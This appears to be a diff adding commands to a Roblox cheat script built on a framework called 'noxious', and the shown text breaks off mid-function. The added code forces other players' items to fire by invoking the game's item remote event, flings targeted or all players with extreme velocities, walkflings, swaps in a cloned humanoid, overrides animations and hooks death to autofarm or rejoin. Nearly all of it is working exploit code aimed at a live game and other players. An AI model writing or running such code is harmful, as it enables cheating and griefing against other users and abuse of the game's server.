+function resolveTargets(target)
+	local players = noxious["players"]
+	local targets = {}
+
+	if target == "me" then
+		table.insert(targets, players.LocalPlayer)
+	elseif target == "others" then
+		for _, player in ipairs(players:GetPlayers()) do
+			if player ~= players.LocalPlayer then
+				table.insert(targets, player)
+			end
+		end
+	elseif target == "all" then
+		targets = players:GetPlayers()
+	elseif target == "random" then
+		local allPlayers = players:GetPlayers()
+		if #allPlayers > 0 then
+			local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+			table.insert(targets, randomPlayer)
+		end
+	else
+		for _, player in ipairs(players:GetPlayers()) do
+			if player.Name:lower():find(target:lower(), 1, true) then
+				table.insert(targets, player)
+				break
+			end
+		end
+	end
+
+	return targets
+end
+
+addcommand("enableloopforceuseitems", "elfui", function(target, delay)
+	local function forceUseItems(target)
+		local players = noxious["players"]
+		local replicatedStorage = game:GetService("ReplicatedStorage")
+		local itemEvent = replicatedStorage:FindFirstChild("Events") and replicatedStorage.Events:FindFirstChild("ItemEvent")
+
+		if not itemEvent then
+			return
+		end
+
+		local function invokeItem(targetPlayer, slot)
+			if not targetPlayer or not targetPlayer.Character then
+				return
+			end
+
+			local character = targetPlayer.Character
+			local inventory = character:FindFirstChild("Inventory")
+			local item = inventory and inventory:FindFirstChild(slot)
+
+			if item then
+				local args = {
+					[1] = character,
+					[2] = item
+				}
+				itemEvent:InvokeServer(unpack(args))
+			end
+		end
+
+		local playersList = {}
+		if target == "me" then
+			table.insert(playersList, players.LocalPlayer)
+		elseif target == "others" then
+			for _, player in ipairs(players:GetPlayers()) do
+				if player ~= players.LocalPlayer then
+					table.insert(playersList, player)
+				end
+			end
+		elseif target == "all" then
+			playersList = players:GetPlayers()
+		elseif target == "random" then
+			local allPlayers = players:GetPlayers()
+			if #allPlayers > 0 then
+				local randomPlayer = allPlayers[math.random(1, #allPlayers)]
+				table.insert(playersList, randomPlayer)
+			end
+		else
+			for _, player in ipairs(players:GetPlayers()) do
+				if player.Name:lower():find(target:lower(), 1, true) then
+					table.insert(playersList, player)
+					break
+				end
+			end
+		end
+
+		if #playersList == 0 then
+			return
+		end
+
+		for _, targetPlayer in ipairs(playersList) do
+			for _, slot in ipairs({ "Slot1", "Slot2", "Slot3" }) do
+				invokeItem(targetPlayer, slot)
+			end
+		end
+	end
+
+	local function loopForceUse(targetPlayer)
+		while loopForceUseItemsTasks[targetPlayer] do
+			forceUseItems(targetPlayer.Name)
+			task.wait(delay)
+		end
+	end
+
+	local targets = resolveTargets(target)
+
+	if #targets == 0 then
+		return
+	end
+
+	for _, targetPlayer in ipairs(targets) do
+		if not loopForceUseItemsTasks[targetPlayer] then
+			loopForceUseItemsTasks[targetPlayer] = true
+			task.spawn(function()
+				loopForceUse(targetPlayer)
+			end)
+		end
+	end
+end)
+
+addcommand("disableloopforceuseitems", "dlfui", function(target)
+	local targets = resolveTargets(target)
+
+	if #targets == 0 then
+		return
+	end
+
+	for _, targetPlayer in ipairs(targets) do
+		loopForceUseItemsTasks[targetPlayer] = nil
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("predictserverposition", "psp", function()
+	if not Game:IsLoaded() then Game.Loaded:Wait() end
+
+	--// Game - Services \\--
+	local Players = Game:GetService("Players")
+	local RunService = Game:GetService("RunService")
+	local Stats = Game:GetService("Stats")
+
+	--// Stats - Items \\--
+	local NetworkStats = Stats:FindFirstChild("Network", false) or Stats:WaitForChild("Network", 60)
+	local ServerStatsItem = NetworkStats:FindFirstChild("ServerStatsItem", false) or NetworkStats:WaitForChild("ServerStatsItem", 60)
+	local DataPing = ServerStatsItem:FindFirstChild("Data Ping", false) or ServerStatsItem:WaitForChild("Data Ping", 60)
+
+	--// Players - LocalPlayer \\-- 
+	local LocalPlayer = Players.LocalPlayer
+	local LocalCharacter = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+	local LocalHumanoid = LocalCharacter:FindFirstChildWhichIsA("Humanoid", false) or LocalCharacter:WaitForChild("Humanoid", 60)
+	local LocalRootPart = LocalHumanoid and (LocalHumanoid.RootPart or LocalCharacter:WaitForChild("HumanoidRootPart", 60))
+	local LocalCharacterClone = nil
+
+	local PingDivisionFactor = 500 -- 500 for the server and 1000 for the client
+	local Connections = {}
+	local PoseHistory = {}
+
+	--// Creates A LocalCharacter Clone | CreateCharacterClone - Function \\--
+	local function CreateCharacterClone()
+		if LocalCharacterClone then
+			LocalCharacterClone:Destroy()
+		end
+
+		task.wait(1)
+
+		LocalCharacter.Archivable = true
+		LocalCharacterClone = LocalCharacter:Clone()
+		LocalCharacterClone.Name = LocalCharacter.Name
+		LocalCharacterClone.Parent = LocalCharacter.Parent
+		LocalCharacter.Archivable = false
+
+		-- Disable Motor6Ds
+		for _, descendant in LocalCharacterClone:GetDescendants() do
+			if descendant:IsA("Motor6D") then
+				descendant.Enabled = false
+			end
+		end
+
+		-- Remove any BillboardGuis
+		for _, descendant in LocalCharacterClone:GetDescendants() do
+			if descendant:IsA("BillboardGui") then
+				descendant:Destroy()
+			end
+		end
+	end
+
+	--// Records LocalCharacter Body Part Positions | RecordPose - Function \\--
+	local function RecordPose(DeltaTime)
+		if not LocalCharacter or not LocalRootPart then return end
+		local CurrentTime = tick()
+		local BodyPartsCFrames = {}
+
+		for _, Descendant in LocalCharacter:GetDescendants() do
+			if not Descendant:IsA("BasePart") or Descendant == LocalRootPart then continue end
+			BodyPartsCFrames[Descendant.Name] = LocalRootPart.CFrame:ToObjectSpace(Descendant.CFrame)
+		end
+
+		table.insert(PoseHistory, {
+			Time = CurrentTime,
+			Pivot = LocalCharacter:GetPivot(),
+			BodyPartsCFrames = BodyPartsCFrames
+		})
+
+		while #PoseHistory > 0 and (CurrentTime - PoseHistory[1].Time) > (1 / DeltaTime) do
+			table.remove(PoseHistory, 1)
+		end
+	end
+
+	--// Updates LocalCharacter Clone Position And Body Parts | UpdateClonePose - Function \\--
+	local function UpdateClonePose()
+		if not (LocalCharacterClone and LocalCharacter) then return end
+
+		local CurrentTime = tick()
+		local PingDelay = math.clamp(DataPing:GetValue() / PingDivisionFactor, 0, math.huge)
+		local TargetTime = CurrentTime - PingDelay
+		local TargetPose = nil
+
+		for Index = #PoseHistory, 1, -1 do
+			if PoseHistory[Index].Time <= TargetTime then
+				TargetPose = PoseHistory[Index]
+				break
+			end
+		end
+
+		if TargetPose then
+			LocalCharacterClone:PivotTo(TargetPose.Pivot)
+
+			for _, Child in LocalCharacterClone:GetChildren() do
+				if not Child:IsA("BasePart") or Child == LocalCharacterClone.Humanoid.RootPart then continue end
+				local RelativeCFrame = TargetPose.BodyPartsCFrames[Child.Name]
+				if not RelativeCFrame then continue end
+				Child.CFrame = LocalCharacterClone.Humanoid.RootPart.CFrame * RelativeCFrame
+			end
+		end
+	end
+
+	--// Predicts LocalPlayer Character Server Position | RunService - BindToRenderStep \\--
+	RunService:BindToRenderStep("Server Position Predictor", 1, function(DeltaTime)
+		RecordPose(DeltaTime)
+		UpdateClonePose()
+
+		if LocalCharacterClone then
+			LocalCharacterClone.Humanoid.DisplayDistanceType = "None"
+			LocalCharacterClone.Humanoid.PlatformStand = true
+
+			for _, Animation in LocalCharacterClone.Humanoid:GetPlayingAnimationTracks() do
+				Animation:Stop()
+			end
+
+			for _, Descendant in LocalCharacterClone:GetDescendants() do
+				if Descendant:IsA("BasePart") then
+					Descendant.CanCollide = false
+					Descendant.CanTouch = false
+					Descendant.CanQuery = false
+					Descendant.Anchored = false
+					if Descendant.Transparency ~= 1 then Descendant.Transparency = 0.5 end
+				elseif Descendant:IsA("Script") or Descendant:IsA("LocalScript") or Descendant:IsA("ForceField") then
+					Descendant:Destroy()
+				end
+			end
+		end
+	end)
+
+	--// LocalPlayer Respawn Handler | LocalPlayer - CharacterAdded \\--
+	LocalPlayer.CharacterAdded:Connect(function(Character)
+		LocalCharacter = Character
+		LocalHumanoid = LocalCharacter:FindFirstChildWhichIsA("Humanoid", false) or LocalCharacter:WaitForChild("Humanoid", 60)
+		LocalRootPart = LocalHumanoid.RootPart or LocalCharacter:WaitForChild("HumanoidRootPart", 60)
+		CreateCharacterClone()
+	end)
+
+	--// LocalPlayer Character Remover Handler | LocalPlayer - CharacterRemoving \\--
+	LocalPlayer.CharacterRemoving:Connect(function()
+		LocalCharacter = nil
+		LocalHumanoid = nil
+		LocalRootPart = nil
+		if LocalCharacterClone then
+			LocalCharacterClone:Destroy()
+			LocalCharacterClone = nil
+		end
+		PoseHistory = {}
+	end)
+
+	CreateCharacterClone()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local clonedModels = {}
+local animationCache = {}
+
+addcommand("clonestack", "cstack", function(clones)
+	local Players = game:GetService("Players")
+	local RunService = game:GetService("RunService")
+
+	local localPlayer = Players.LocalPlayer
+
+	local stepOffset = CFrame.new(0, 2.9, -0.2)
+	local extraYOffset = 0.8
+	local extraZOffset = -0.2
+
+	local clonesPerModel = tonumber(clones)
+	local animationId = "rbxassetid://16873659196"
+
+	local function getLocalHead()
+		local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+		return character:WaitForChild("Head", 5)
+	end
+
+	local function playAnimation(model)
+		if animationCache[model] then return end
+		animationCache[model] = true
+
+		local humanoid = model:FindFirstChildOfClass("Humanoid")
+		if humanoid then
+			local anim = Instance.new("Animation")
+			anim.AnimationId = animationId
+			local track = humanoid:LoadAnimation(anim)
+			track:Play()
+		end
+	end
+
+	local function removeBillboards(model)
+		for _, descendant in ipairs(model:GetDescendants()) do
+			if descendant:IsA("BillboardGui") then
+				descendant:Destroy()
+			end
+		end
+	end
+
+
+	local function cloneCharacters()
+		local sourceCharacter = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+		for i = 1, clonesPerModel do
+			local clone = sourceCharacter:Clone()
+			removeBillboards(clone)
+			clone.Parent = workspace
+			table.insert(clonedModels, clone)
+		end
+	end
+
+	task.spawn(cloneCharacters)
+
+	RunService.RenderStepped:Connect(function()
+		local head = getLocalHead()
+		if not head then return end
+
+		for i, model in ipairs(clonedModels) do
+			local root = model:FindFirstChild("HumanoidRootPart")
+			if root then
+				local totalOffset = CFrame.new()
+				for j = 1, i do
+					totalOffset = totalOffset * stepOffset
+				end
+
+				local ySpacing = (i > 1) and CFrame.new(0, (i - 1) * extraYOffset, (i - 1) * extraZOffset) or CFrame.new()
+
+				root.CFrame = head.CFrame * totalOffset * ySpacing
+				playAnimation(model)
+			end
+		end
+	end)
+end)
+
+addcommand("unclonestack", "uncstack", function()
+	for _, model in ipairs(clonedModels) do
+		if model and model.Parent then
+			model:Destroy()
+		end
+	end
+	table.clear(clonedModels)
+	table.clear(animationCache)
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("fling", "fling", function(user)
+	if cannotruninlobby() then return end
+	if cannotruninrun() then return end
+
+	local Players = noxious["players"]
+	local Player = Players.LocalPlayer
+	local Targets = {user}
+
+	local AllBool = false
+
+	local GetPlayer = function(Name)
+		Name = Name:lower()
+		if Name == "all" or Name == "others" then
+			AllBool = true
+			return
+		elseif Name == "random" then
+			local GetPlayers = Players:GetPlayers()
+			if table.find(GetPlayers, Player) then table.remove(GetPlayers, table.find(GetPlayers, Player)) end
+			return GetPlayers[math.random(#GetPlayers)]
+		elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+			for _, x in next, Players:GetPlayers() do
+				if x ~= Player then
+					if x.Name:lower():match("^" .. Name) then
+						return x
+					elseif x.DisplayName:lower():match("^" .. Name) then
+						return x
+					end
+				end
+			end
+		else
+			return
+		end
+	end
+
+	local SkidFling = function(TargetPlayer)
+		local Character = Player.Character
+		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+		local RootPart = Humanoid and Humanoid.RootPart
+
+		local TCharacter = TargetPlayer.Character
+		local THumanoid
+		local TRootPart
+		local THead
+		local Accessory
+		local Handle
+
+		if TCharacter:FindFirstChildOfClass("Humanoid") then
+			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+		end
+		if THumanoid and THumanoid.RootPart then
+			TRootPart = THumanoid.RootPart
+		end
+		if TCharacter:FindFirstChild("Head") then
+			THead = TCharacter.Head
+		end
+		if TCharacter:FindFirstChildOfClass("Accessory") then
+			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+		end
+		if Accessory and Accessory:FindFirstChild("Handle") then
+			Handle = Accessory.Handle
+		end
+
+		if Character and Humanoid and RootPart then
+			if RootPart.Velocity.Magnitude < 50 then
+				getgenv().OldPos = RootPart.CFrame
+			end
+			if THumanoid and THumanoid.Sit and not AllBool then
+			end
+			if THead then
+				workspace.CurrentCamera.CameraSubject = THead
+			elseif not THead and Handle then
+				workspace.CurrentCamera.CameraSubject = Handle
+			elseif THumanoid and TRootPart then
+				workspace.CurrentCamera.CameraSubject = THumanoid
+			end
+			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+				return
+			end
+
+			local FPos = function(BasePart, Pos, Ang)
+				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+			end
+
+			local SFBasePart = function(BasePart)
+				local TimeToWait = 2
+				local Time = tick()
+				local Angle = 0
+
+				repeat
+					if RootPart and THumanoid then
+						if BasePart.Velocity.Magnitude < 50 then
+							Angle = Angle + 100
+
+							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+						else
+							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
+							task.wait()
+
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+							task.wait()
+						end
+					else
+						break
+					end
+				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or TargetPlayer.Character ~= TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+			end
+
+			workspace.FallenPartsDestroyHeight = 0 / 0
+
+			local BV = Instance.new("BodyVelocity")
+			BV.Name = "EpixVel"
+			BV.Parent = RootPart
+			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+			BV.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
+
+			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+			if TRootPart then
+				SFBasePart(TRootPart)
+			elseif THead then
+				SFBasePart(THead)
+			elseif Accessory and Handle then
+				SFBasePart(Handle)
+			end
+
+			BV:Destroy()
+			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+			workspace.CurrentCamera.CameraSubject = Humanoid
+
+			repeat
+				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+				Humanoid:ChangeState("GettingUp")
+				table.foreach(Character:GetChildren(), function(_, x)
+					if x:IsA("BasePart") then
+						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+					end
+				end)
+				task.wait()
+			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+			workspace.FallenPartsDestroyHeight = getgenv().FPDH
+		end
+	end
+
+	getgenv().Welcome = true
+	if Targets[1] then
+		for _, x in next, Targets do
+			GetPlayer(x)
+		end
+	else
+		return
+	end
+
+	if AllBool then
+		for _, x in next, Players:GetPlayers() do
+			SkidFling(x)
+		end
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("exitdeath", "ed", function()
+	if noxious["humanoid"] then
+		noxious["humanoid"].Died:Connect(function()
+			game:Shutdown()
+		end)
+	end
+end)
+
+addcommand("rejoindeath", "rjd", function()
+	if noxious["humanoid"] then
+		noxious["humanoid"].Died:Connect(function()
+			if noxiousautofarmrunning or dekaautofarmrunning then execcmd("sshop") else execcmd("jl") end
+		end)
+	end
+end)
+
+addcommand("rerundeath", "rrund", function()
+	if noxious["humanoid"] then
+		noxious["humanoid"].Died:Connect(function()
+			execcmd("rerun")
+		end)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+walkflinging = false
+
+function getRoot(char)
+	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+	return rootPart
+end
+
+addcommand("enablewalkfling", "ewf", function()
+	local humanoid = noxious["character"]:FindFirstChildWhichIsA("Humanoid")
+	if humanoid then
+		humanoid.Died:Connect(function()
+			execcmd("disablewalkfling")
+		end)
+	end
+
+	local walkflinging = true
+	repeat noxious["run service"].Heartbeat:Wait()
+		local character = noxious["character"]
+		local root = getRoot(character)
+		local vel, movel = nil, 0.1
+
+		while not (character and character.Parent and root and root.Parent) do
+			noxious["run service"].Heartbeat:Wait()
+			character = noxious["character"]
+			root = getRoot(character)
+		end
+
+		vel = root.Velocity
+		root.Velocity = vel * 1000000 + Vector3.new(0, 1000000, 0)
+
+		noxious["run service"].RenderStepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel
+		end
+
+		noxious["run service"].Stepped:Wait()
+		if character and character.Parent and root and root.Parent then
+			root.Velocity = vel + Vector3.new(0, movel, 0)
+			movel = movel * -1
+		end
+	until walkflinging == false
+end)
+
+addcommand("disablewalkfling", "dwf", function()
+	walkflinging = false
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("becomecharacter", "bchar", function()
+	if inrun() then return end
+	local Players = game:GetService("Players")		
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")		
+	local speaker = Players.LocalPlayer
+
+	local args = {
+		[1] = false
+	}
+	ReplicatedStorage.Events.UpdateSpawnedIn:FireServer(unpack(args))
+
+	local character = speaker.Character
+	local savedCFrame
+
+	if character then
+		local rootPart = character:FindFirstChild("HumanoidRootPart")			
+		if rootPart then
+			savedCFrame = rootPart.CFrame
+		end
+	end
+
+	if character then
+		local humanoid = character:FindFirstChildWhichIsA("Humanoid")			
+		if humanoid then
+			humanoid.Health = 0
+		end
+	end
+
+	speaker.CharacterAdded:Wait()
+	local newCharacter = speaker.Character
+
+	if not newCharacter then return end
+
+	local function setupHumanoid()
+		local Cam = workspace.CurrentCamera
+		local Pos = Cam.CFrame
+		local Char = newCharacter
+		local Human = Char:FindFirstChildWhichIsA("Humanoid")
+
+		if not Human then return end
+
+		local nHuman = Human:Clone()
+		nHuman.Parent = Char
+		speaker.Character = nil
+
+		nHuman.BreakJointsOnDeath = true
+		nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+
+		Human:Destroy()
+		speaker.Character = Char
+		Cam.CameraSubject = nHuman
+		Cam.CFrame = Pos
+
+		local rootPart = Char:FindFirstChild("HumanoidRootPart")			
+		if rootPart and savedCFrame then
+			rootPart.CFrame = savedCFrame
+		end
+
+		local animateScript = Char:FindFirstChild("Animate")			
+		if animateScript then
+			animateScript.Disabled = true
+			task.wait()
+			animateScript.Disabled = false
+		end
+
+		nHuman.Health = nHuman.MaxHealth
+	end
+
+	newCharacter:WaitForChild("Humanoid", 5)
+	setupHumanoid()
+
+	task.wait(0)
+
+	local Cam = workspace.CurrentCamera
+	local Pos, Char = Cam.CFrame, speaker.Character
+	local Human = Char and Char.FindFirstChildWhichIsA(Char, "Humanoid")
+	local nHuman = Human.Clone(Human)
+	nHuman.Parent, speaker.Character = Char, nil
+	nHuman.SetStateEnabled(nHuman, 15, false)
+	nHuman.SetStateEnabled(nHuman, 1, false)
+	nHuman.SetStateEnabled(nHuman, 0, false)
+	nHuman.BreakJointsOnDeath, Human = true, Human.Destroy(Human)
+	speaker.Character, Cam.CameraSubject, Cam.CFrame = Char, nHuman, task.wait() and Pos
+	nHuman.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+	local Script = Char.FindFirstChild(Char, "Animate")
+	if Script then
+		Script.Disabled = true
+		task.wait()
+		Script.Disabled = false
+	end
+	nHuman.Health = nHuman.MaxHealth
+
+	task.wait(1)
+
+	savedCFrame = nil
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local Players = noxious["players"]
+local player = Players.LocalPlayer
+local humanoid
+local animationTracks = {}
+local loopStates = {}
+local config
+local character
+
+function setupAnimations(char)
+	character = char
+	animationTracks = {}
+	loopStates = {}
+	humanoid = character:WaitForChild("Humanoid")
+
+	if not noxious["in studio"] then
+		while true do
+			config = character:FindFirstChild("Animations")
+			if config then
+				for _, anim in ipairs(config:GetChildren()) do
+					if anim:IsA("Animation") then
+						local track = humanoid:LoadAnimation(anim)
+						animationTracks[anim.Name] = track
+						loopStates[anim.Name] = false
+						track:AdjustWeight(10)
+					end
+				end
+				break
+			end
+			task.wait(0.25)
+		end
+	end
+end
+
+function monitorCharacter()
+	while true do
+		local inGameFolder = workspace:FindFirstChild("InGamePlayers")
+		if inGameFolder then
+			local inGameChar = inGameFolder:FindFirstChild(player.Name)
+			if inGameChar then
+				setupAnimations(inGameChar)
+				break
+			end
+		end
+
+		if player.Character then
+			setupAnimations(player.Character)
+			break
+		end
+
+		task.wait(0.5)
+	end
+end
+
+task.spawn(monitorCharacter)
+
+player.CharacterAdded:Connect(function(char)
+	task.spawn(function()
+		task.wait(0.1)
+		monitorCharacter()
+	end)
+end)
+
+function enableAnimationLoop(animName)
+	resetanims()
+	local track = animationTracks[animName]
+	if track and not loopStates[animName] then
+		track.Looped = true
+		track:Play()
+		loopStates[animName] = true
+	end
+end
+
+function disableAnimationLoop(animName)
+	local track = animationTracks[animName]
+	if track and loopStates[animName] then
+		track.Looped = false
+		track:Stop()
+		loopStates[animName] = false
+	end
+end
+
+function disableAllAnimationLoops()
+	for animName, track in pairs(animationTracks) do
+		if loopStates[animName] then
+			track.Looped = false
+			track:Stop()
+			loopStates[animName] = false
+		end
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+local movementcheck
+local animpacktracking = {}
+local lastmovementstate = {
+	moving = false,
+	sprinting = false,
+	decoding = false
+}
+
+local basews = 16
+local sprintmultiplier = 1.3
+
+function cleananim(name)
+	if animpacktracking[name] then
+		if animpacktracking[name].IsPlaying then
+			animpacktracking[name]:Stop(0.1)
+		end
+		animpacktracking[name]:Destroy()
+		animpacktracking[name] = nil
+	end
+end
+
+function changeanim(name, id)
+	if not config or not character then return end
+
+	pauseanims()
+
+	local animation = config:FindFirstChild(name)
+	if animation and animation:IsA("Animation") then
+		cleananim(name)
+
+		local newId = "rbxassetid://" .. tostring(id)
+		animation.AnimationId = newId
+
+		local newTrack = humanoid:LoadAnimation(animation)
+		newTrack:AdjustWeight(999)
+		animpacktracking[name] = newTrack
+		loopStates[name] = false
+
+		checkthenapplyanims(true)
+
+		if movementcheck then 
+			movementcheck:Disconnect() 
+		end
+
+		movementcheck = noxious["run service"].Heartbeat:Connect(function()
+			checkthenapplyanims()
+		end)
+	end
+end
+
+function calcspeed()
+	if not humanoid then return 2 end
+
+	local speedRatio = humanoid.WalkSpeed / basews
+
+	return math.max(1.1, speedRatio * sprintmultiplier)
+end
+
+function checkthenapplyanims(forceupd)
+	if not character or not humanoid or not humanoid.RootPart then return end
+
+	local velocity = humanoid.RootPart.Velocity
+	local isMoving = velocity.Magnitude > 1
+	local decoding = character:FindFirstChild("Decoding")
+	local stats = character:FindFirstChild("Stats")
+	local sprinting = stats and stats:FindFirstChild("Sprinting") and stats.Sprinting.Value
+
+	local stateChanged = forceupd or
+		(isMoving ~= lastmovementstate.moving) or
+		(sprinting ~= lastmovementstate.sprinting) or
+		(decoding and decoding.Value ~= lastmovementstate.decoding)
+
+	if not stateChanged then return end
+
+	local previousState = {
+		moving = lastmovementstate.moving,
+		sprinting = lastmovementstate.sprinting,
+		decoding = lastmovementstate.decoding
+	}
+
+	lastmovementstate.moving = isMoving
+	lastmovementstate.sprinting = sprinting
+	lastmovementstate.decoding = decoding and decoding.Value
+
+	local function transitionanim(oldAnim, newAnim, speed)
+		if oldAnim ~= newAnim and animpacktracking[oldAnim] then
+			if animpacktracking[oldAnim].IsPlaying then
+				animpacktracking[oldAnim]:Stop(0.1)
+			end
+		end
+
+		if newAnim and animpacktracking[newAnim] then
+			if not animpacktracking[newAnim].IsPlaying then
+				animpacktracking[newAnim]:Play(0.1)
+				if speed then 
+					local finalSpeed = (newAnim == "Walk" and sprinting) and calcspeed() or speed
+					animpacktracking[newAnim]:AdjustSpeed(finalSpeed)
+				end
+			elseif speed then
+				local finalSpeed = (newAnim == "Walk" and sprinting) and calcspeed() or speed
+				animpacktracking[newAnim]:AdjustSpeed(finalSpeed)
+			end
+		end
+	end
+
+	if animpacktracking["Decode"] then
+		if decoding and decoding.Value then
+			transitionanim(nil, "Decode", 1)
+			return
+		else
+			transitionanim("Decode", nil)
+		end
+	end
+
+	if isMoving then
+		if sprinting then
+			transitionanim("Idle", nil)
+			transitionanim("Walk", "Walk", calcspeed())
+			transitionanim(nil, "Run", 1)
+		else
+			transitionanim("Idle", nil)
+			transitionanim("Run", nil)
+			transitionanim(nil, "Walk", 1)
+		end
+	else
+		transitionanim("Walk", nil)
+		transitionanim("Run", nil)
+		transitionanim(nil, "Idle", 1)
+	end
+end
+
+function applyanimpack(toon)
+	if not toon then return end
+	resetanimpack()
+	toon = string.lower(toon)
+
+	if toon == "therian" then
+		if cannotruninlobby() then return end
+		notify("Therian animations equipped.", 5)
+		changeanim("Run", 17649190982)
+
+	elseif toon == "boxten" then
+		notify("Boxten's animations equipped.", 5)
+		changeanim("Walk", 16987891441)
+		changeanim("Decode", 16987946868)
+		changeanim("Idle", 16987798588)
+	elseif toon == "blot" then
+		notify("Blot's animations equipped.", 5)
+		changeanim("Run", 105628011122110)
+		changeanim("Walk", 76703698283994)
+		changeanim("Decode", 116500889072011)
+		changeanim("Idle", 73993990162132)
+	elseif toon == "brightney" then
+		notify("Brightney's animations equipped.", 5)
+		changeanim("Walk", 17267881920)
+		changeanim("Decode", 17268071696)
+		changeanim("Idle", 17266012992)
+	elseif toon == "connie" then
+		notify("Connie's animations equipped.", 5)
+		changeanim("Walk", 71819089910283)
+		changeanim("Decode", 133500601575506)
+		changeanim("Idle", 96412679901902)
+	elseif toon == "cosmo" then
+		notify("Cosmo's animations equipped.", 5)
+		changeanim("Walk", 18608782689)
+		changeanim("Decode", 18609287742)
+		changeanim("Idle", 18608700264)
+	elseif toon == "dandy" then
+		notify("Dandy's animations equipped.", 5)
+		changeanim("Walk", 16496812530)
+		changeanim("Decode", 16496852675)
+		changeanim("Idle", 16496520991)
+	elseif toon == "finn" then
+		notify("Finn's animations equipped.", 5)
+		changeanim("Walk", 18717500470)
+		changeanim("Decode", 18718380478)
+		changeanim("Idle", 18717443931)
+	elseif toon == "flutter" then
+		notify("Flutter's animations equipped.", 5)
+		changeanim("Walk", 18226261062)
+		changeanim("Decode", 18226338406)
+		changeanim("Idle", 18226198149)
+	elseif toon == "gigi" then
+		notify("Gigi's animations equipped.", 5)
+		changeanim("Walk", 79372488497037)
+		changeanim("Decode", 88765331625241)
+		changeanim("Idle", 131680997351874)
+	elseif toon == "glisten" then
+		notify("Glisten's animations equipped.", 5)
+		changeanim("Walk", 18789278688)
+		changeanim("Decode", 18789412964)
+		changeanim("Idle", 18789173875)
+	elseif toon == "goob" then
+		notify("Goob's animations equipped.", 5)
+		changeanim("Walk", 17231273641)
+		changeanim("Decode", 16987946868)
+		changeanim("Idle", 17231779680)
+	elseif toon == "looey" then
+		notify("Looey's animations equipped.", 5)
+		changeanim("Walk", 124245470232056)
